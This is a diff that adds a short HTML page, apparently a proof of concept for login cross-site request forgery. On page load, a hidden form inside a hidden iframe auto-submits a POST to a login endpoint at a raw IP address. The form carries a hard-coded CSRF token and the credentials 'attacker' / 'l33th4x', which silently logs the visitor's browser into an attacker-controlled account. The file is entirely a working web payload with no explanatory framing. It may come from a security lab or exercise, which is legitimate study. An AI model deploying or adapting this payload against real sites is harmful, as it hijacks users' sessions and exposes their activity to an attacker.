@@ -1,0 +1,13 @@
+<html>
+	<body>
+		<iframe style="display:none" name="csrf-frame"></iframe>
+		<form method='POST' action='http://54.159.156.104/login' target="csrf-frame" id="csrf-form">
+			<input type='hidden' name='csrf_token' value='013fdc98588f47e52accbc767db53c92'>
+			<input type='hidden' name='username' value="attacker">
+			<input type='hidden' name='password' value="l33th4x">
+		</form>
+	<script>
+		document.getElementById("csrf-form").submit()
+	</script>
+	</body>
+</html>
